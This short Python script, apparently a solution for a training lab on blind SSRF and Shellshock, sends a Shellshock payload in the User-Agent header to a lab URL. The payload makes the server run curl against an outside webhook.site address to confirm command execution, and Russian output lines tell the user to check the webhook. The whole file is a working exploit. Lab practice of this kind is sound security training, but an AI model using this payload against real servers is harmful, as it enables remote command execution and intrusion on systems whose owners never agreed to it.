

import requests

url = "http://lap3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
my_webhook = "https://webhook.site/238a8641-5b7c-4460-b4b9-836a82d2dde8"
payload = f"() {{ :; }}; curl {my_webhook}"

headers = {
    "User-Agent": payload
}

response = requests.get(url, headers=headers)
print("Status code:", response.status_code)
print("Ответ лаборатории:", response.text)
print("Проверь свой webhook: должен прийти входящий запрос!")

